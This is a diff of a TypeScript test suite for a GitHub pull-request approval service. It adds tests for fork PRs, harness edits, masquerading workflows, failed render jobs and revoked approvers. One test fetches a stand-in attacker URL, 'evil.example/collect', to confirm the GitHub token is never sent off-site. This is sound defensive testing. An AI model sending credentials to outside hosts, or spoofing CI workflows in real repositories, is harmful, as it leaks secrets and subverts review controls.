@@ -103,7 +103,7 @@ interface Pull extends Json {
 	draft: boolean;
 	created_at: string;
 	updated_at: string;
-	head: { sha: string; ref: string };
+	head: { sha: string; ref: string; repo: { full_name: string } | null };
 	base: { ref: string };
 	user: { login: string; type: string } | null;
 	labels: { name: string }[];
@@ -128,6 +128,7 @@ const gh = {
 	pulls: new Map<number, Pull>(),
 	heads: new Map<string, Head>(),
 	artifacts: new Map<number, Artifact[]>(),
+	jobs: new Map<number, Json[]>(),
 	zips: new Map<number, Buffer>(),
 	posts: [] as { sha: string; body: Json }[],
 	mints: 0,
@@ -219,6 +220,9 @@ const fakeFetch: typeof fetch = async (input, init) => {
 	if (rest[0] === 'actions' && rest[1] === 'runs' && rest[3] === 'artifacts') {
 		return jsonResponse(200, { artifacts: gh.artifacts.get(Number(rest[2])) ?? [] });
 	}
+	if (rest[0] === 'actions' && rest[1] === 'runs' && rest[3] === 'jobs') {
+		return jsonResponse(200, { jobs: gh.jobs.get(Number(rest[2])) ?? [] });
+	}
 	if (rest[0] === 'actions' && rest[1] === 'artifacts' && rest[3] === 'zip') {
 		const zip = gh.zips.get(Number(rest[2]));
 		if (!zip) return jsonResponse(410, { message: 'Gone' });
@@ -302,9 +306,21 @@ function workflow(head: Head, name: string, jobs: JobSpec[], extra: Json = {}): 
 	const check_suite_id = ++suite;
 	const statuses = jobs.map((j) => j.status ?? 'completed');
 	const conclusions = jobs.map((j) => (j.conclusion === undefined ? 'success' : j.conclusion));
+	gh.jobs.set(
+		id,
+		jobs.map((j, i) => ({
+			id: id * 100 + i,
+			name: j.name,
+			status: statuses[i],
+			conclusion: statuses[i] === 'completed' ? conclusions[i] : null,
+		})),
+	);
 	head.workflowRuns.push({
 		id,
 		name,
+		path: `.github/workflows/${name === 'Current games' ? 'current-games' : name.toLowerCase()}.yml`,
+		repository: { full_name: REPO },
+		head_repository: { full_name: REPO },
 		event: 'pull_request',
 		status: statuses.every((s) => s === 'completed') ? 'completed' : 'in_progress',
 		conclusion: statuses.every((s) => s === 'completed')
@@ -404,7 +420,7 @@ function pull(
 		draft: false,
 		created_at: AT,
 		updated_at: AT,
-		head: { sha: headSha, ref: `feat/${number}` },
+		head: { sha: headSha, ref: `feat/${number}`, repo: { full_name: REPO } },
 		base: { ref: 'main' },
 		user: { login: 'dev', type: 'User' },
 		labels: labels.map((name) => ({ name })),
@@ -578,6 +594,9 @@ const h14 = head(sha(14), GREEN, { state: 'failure', description: LINE_14 });
 h14.workflowRuns.push({
 	id: ++runId,
 	name: 'Current games',
+	path: '.github/workflows/current-games.yml',
+	repository: { full_name: REPO },
+	head_repository: { full_name: REPO },
 	event: 'push',
 	status: 'completed',
 	conclusion: 'success',
@@ -695,6 +714,99 @@ head(sha(23), GREEN, {
 artifact(sha(23), REPORT_23);
 pull(23, 'engine: two at once', { sha: sha(23) });
 
+// #24 — from a fork: never a change.
+head(sha(24), GREEN, { state: 'success', description: 'ok' });
+pull(24, 'fork: drive-by', {
+	sha: sha(24),
+	head: { sha: sha(24), ref: 'patch-1', repo: { full_name: 'someone/engine' } },
+});
+
+// #25 — edits the harness: its own report proves nothing.
+const REPORT_25 = report(sha(25), [
+	{ key: 'bookofborut', name: 'Book of Borut', looks: 'changed', changed: ['win'] },
+]);
+head(sha(25), GREEN, {
+	state: 'failure',
+	description: (REPORT_25.summary as { line: string }).line,
+});
+artifact(sha(25), REPORT_25);
+pull(25, 'ci(director): loosen the tolerance', {
+	sha: sha(25),
+	files: [
+		{
+			filename: 'scripts/current-games/tolerance.json',
+			status: 'modified',
+			additions: 1,
+			deletions: 1,
+		},
+		{ filename: 'apps/lines/src/game/config.ts', status: 'modified', additions: 1, deletions: 1 },
+	],
+});
+
+// #26 — a report that names no head commit.
+const REPORT_26 = report(sha(26), [
+	{ key: 'bookofborut', name: 'Book of Borut', looks: 'changed', changed: ['win'] },
+]);
+delete REPORT_26.head;
+head(sha(26), GREEN, {
+	state: 'failure',
+	description: (REPORT_26.summary as { line: string }).line,
+});
+artifact(sha(26), REPORT_26);
+pull(26, 'engine: headless report', { sha: sha(26) });
+
+// #27 — a workflow of the PR's own that calls itself "Current games" and posts the status.
+const h27 = head(sha(27), GREEN);
+workflow(
+	h27,
+	'Current games',
+	[
+		{ name: 'prepare' },
+		{ name: 'build' },
+		{ name: 'gates' },
+		{ name: 'render (1/20)' },
+		{ name: 'report', conclusion: 'failure' },
+	],
+	{ head_sha: sha(27), path: '.github/workflows/evil.yml' },
+);
+h27.statuses.push({
+	context: 'current-games',
+	state: 'failure',
+	description: '1 pass · 1 fail · 0 not rendered · 1 changed screen(s)',
+	target_url: `https://github.com/${REPO}/actions/runs/0`,
+	updated_at: AT,
+});
+const REPORT_27 = report(sha(27), [
+	{ key: 'bookofborut', name: 'Book of Borut', looks: 'changed', changed: ['win'] },
+]);
+artifact(sha(27), REPORT_27);
+pull(27, 'engine: masquerade', { sha: sha(27) });
+
+// #28 — the report says "changed screens only" but a render job failed.
+const REPORT_28 = report(sha(28), [
+	{ key: 'bookofborut', name: 'Book of Borut', looks: 'changed', changed: ['win'] },
+]);
+head(sha(28), GREEN, {
+	state: 'failure',
+	description: (REPORT_28.summary as { line: string }).line,
+});
+artifact(sha(28), REPORT_28);
+for (const job of gh.jobs.get(Number(harnessRun(sha(28)).id)) ?? []) {
+	if (job.name === 'render (1/20)') job.conclusion = 'failure';
+}
+pull(28, 'engine: a shard died', { sha: sha(28) });
+
+// #29 — an approver who loses the capability before the set completes.
+const REPORT_29 = report(sha(29), [
+	{ key: 'bookofborut', name: 'Book of Borut', looks: 'changed', changed: ['win', 'bigwin'] },
+]);
+head(sha(29), GREEN, {
+	state: 'failure',
+	description: (REPORT_29.summary as { line: string }).line,
+});
+artifact(sha(29), REPORT_29);
+pull(29, 'engine: a revoked approver', { sha: sha(29) });
+
 // ── Replaced boundaries ───────────────────────────────────────────────────────
 const approvals: PipelineApproval[] = [];
 fake('lib/server/pipelineApprovals.ts', {
@@ -711,7 +823,13 @@ fake('lib/server/pipelineApprovals.ts', {
 		approvals.push(row);
 		return row;
 	},
+	getApprover: async (userId: string) => accounts.get(userId) ?? null,
 });
+const accounts = new Map<string, { role: string; active: boolean; expiresAt: Date | null }>([
+	['u-admin', { role: 'admin', active: true, expiresAt: null }],
+	['u-tester', { role: 'pipelineTester', active: true, expiresAt: null }],
+	['u-artist', { role: 'artist', active: true, expiresAt: null }],
+]);
 const userOverrides = new Map<string, Record<string, boolean>>();
 fake('lib/server/roleToolAccess.ts', { getRoleOverrides: async () => ({}) });
 fake('lib/server/userToolAccess.ts', {
@@ -835,6 +953,19 @@ process.env.GITHUB_APP_PRIVATE_KEY = privateKey.replace(/\n/g, '\\n');
 	check('…one extra mint', gh.mints - before, 3);
 	const again = await app.fetch(path);
 	check('…and the new token is then cached', [again.status, gh.mints - before], [200, 3]);
+	const requestsBefore = gh.requests.length;
+	const elsewhere = await app.fetch('https://evil.example/collect').catch((e: unknown) => e);
+	check(
+		'the token never goes to a URL outside api.github.com',
+		[elsewhere instanceof GithubAppError, gh.requests.length - requestsBefore],
+		[true, 0],
+	);
+	thrown.push(String((elsewhere as Error).message));
+	check(
+		"a full URL of GitHub's own passes",
+		(await app.fetch(`https://api.github.com${path}`)).status,
+		200,
+	);
 
 	const bad = createGithubApp({
 		config: () => ({ appId: APP_ID, installationId: INSTALLATION_ID, privateKey: 'not a pem' }),
@@ -1068,16 +1199,21 @@ check('a role without the tool is a 403', (await list(ARTIST)).status, 403);
 {
 	const res = await list(TESTER);
 	check('a Pipeline Tester sees the list', res.status, 200);
-	const body = res.body as { changes: Json[]; dependabot: Json[] };
+	const body = res.body as { changes: Json[]; dependabot: Json[]; forksSkipped: number };
 	check(
 		'every open PR into main, newest first, bar Director games and Dependabot',
 		body.changes.map((c) => c.number),
-		[23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 10],
+		[29, 28, 27, 26, 25, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 10],
 	);
 	check(
 		'Dependabot apart',
 		body.dependabot.map((c) => c.number),
 		[11],
+	);
+	check(
+		'the fork is skipped and counted',
+		[(body as Json).forksSkipped, gh.requests.some((r) => r.includes('/pulls/24'))],
+		[1, false],
 	);
 	check(
 		'the other base was never asked for',
@@ -1254,6 +1390,34 @@ check('a bad number is a 400', (await detail(ADMIN, 'x')).status, 400);
 		'ready',
 	);
 }
+check('a fork is not a change', (await detail(ADMIN, '24')).status, 404);
+{
+	const d = (await detail(ADMIN, '25')).body as { harness: Json; status: Json };
+	check(
+		'#25: a change that edits the harness cannot be approved',
+		String(d.harness.unapprovable),
+		'This change edits the harness (scripts/current-games/tolerance.json), so its report proves nothing about it: harness changes need a manual merge after review.',
+	);
+	check('#25: …though its report reads', (d.harness.report as Json).state, 'ready');
+}
+{
+	const d = (await detail(ADMIN, '26')).body as { harness: Json };
+	check(
+		'#26: a report naming no head is stale',
+		[(d.harness.report as Json).state, (d.harness.report as Json).detail],
+		['stale', 'The report names no head commit.'],
+	);
+}
+{
+	const d = (await detail(ADMIN, '27')).body as { harness: Json; checks: Json[] };
+	check('#27: a PR\'s own workflow called "Current games" is not the harness', d.harness.run, null);
+	check('#27: …so there is no report', (d.harness.report as Json).state, 'none');
+	check(
+		'#27: …and its jobs show in Check 1 like any workflow',
+		d.checks.some((g) => g.workflow === 'Current games'),
+		true,
+	);
+}
 {
 	const d = (await detail(ADMIN, '22')).body as { harness: Json };
 	check("#22: a report from another attempt is 'stale'", (d.harness.report as Json).state, 'stale');
@@ -1378,7 +1542,7 @@ check('nothing posted so far', gh.posts, []);
 userOverrides.set('u-tester', { pipelineMerge: true });
 {
 	const p14 = gh.pulls.get(14) as Pull;
-	p14.head = { sha: sha(140), ref: p14.head.ref };
+	p14.head = { ...p14.head, sha: sha(140) };
 	const report140 = report(sha(140), [
 		{ key: 'bookofborut', name: 'Book of Borut', looks: 'changed', changed: ['win', 'bigwin'] },
 		{ key: 'hotfruits', name: 'HotFruits', looks: 'same' },
@@ -1485,6 +1649,90 @@ check(
 		[1, sha(23), 'All 2 changed screens approved by tester, Gualtiero'],
 	);
 }
+// ── What an approval must refuse, whatever the report says ───────────────────
+check(
+	'a fork refuses an approval',
+	(await approve(ADMIN, '24', { diffId: `${sha(24)}:bookofborut:win:abcd` })).status,
+	404,
+);
+{
+	const res = await approve(ADMIN, '25', {
+		diffId: (REPORT_25.summary as { changedScreens: string[] }).changedScreens[0],
+	});
+	check('a change that edits the harness refuses an approval', res.status, 409);
+	check('…saying why', String(res.body.error).includes('manual merge'), true);
+	check(
+		'…and records nothing',
+		approvals.some((a) => a.headSha === sha(25)),
+		false,
+	);
+}
+check(
+	'a report naming no head refuses an approval',
+	(
+		await approve(ADMIN, '26', {
+			diffId: (REPORT_26.summary as { changedScreens: string[] }).changedScreens[0],
+		})
+	).status,
+	409,
+);
+check(
+	"a masquerading workflow's report refuses an approval",
+	(
+		await approve(ADMIN, '27', {
+			diffId: (REPORT_27.summary as { changedScreens: string[] }).changedScreens[0],
+		})
+	).status,
+	409,
+);
+{
+	const posts = gh.posts.length;
+	const res = await approve(ADMIN, '28', {
+		diffId: (REPORT_28.summary as { changedScreens: string[] }).changedScreens[0],
+	});
+	check(
+		'a report the jobs API contradicts is approved but never posted',
+		[res.status, res.body.approved, res.body.of, res.body.statusPosted, gh.posts.length - posts],
+		[200, 1, 1, false, 0],
+	);
+	check('…saying which job', String(res.body.withheld).includes('render (1/20) (failure)'), true);
+}
+{
+	const [a, b] = (REPORT_29.summary as { changedScreens: string[] }).changedScreens;
+	const posts = gh.posts.length;
+	check(
+		'the tester approves the first diff',
+		(await approve(TESTER, '29', { diffId: a })).status,
+		200,
+	);
+	userOverrides.delete('u-tester');
+	const second = await approve(ADMIN, '29', { diffId: b });
+	check(
+		'an approval by someone who lost pipelineMerge no longer counts',
+		[second.body.approved, second.body.of, second.body.statusPosted, gh.posts.length - posts],
+		[1, 2, false, 0],
+	);
+	userOverrides.set('u-tester', { pipelineMerge: true });
+	const again = await approve(ADMIN, '29', { diffId: b });
+	check(
+		'…and counts again once it is back',
+		[again.body.approved, again.body.statusPosted, gh.posts.length - posts],
+		[2, true, 1],
+	);
+	accounts.set('u-tester', { role: 'pipelineTester', active: false, expiresAt: null });
+	const h = gh.heads.get(sha(29)) as Head;
+	h.statuses = h.statuses.map((st) =>
+		st.context === 'current-games' ? { ...st, state: 'failure' } : st,
+	);
+	const disabled = await approve(ADMIN, '29', { diffId: b });
+	check(
+		'a disabled approver no longer counts either',
+		[disabled.body.approved, disabled.body.statusPosted],
+		[1, false],
+	);
+	accounts.set('u-tester', { role: 'pipelineTester', active: true, expiresAt: null });
+}
+
 check(
 	'no email address was ever posted to GitHub',
 	gh.posts.some((p) => String(p.body.description).includes('@')),
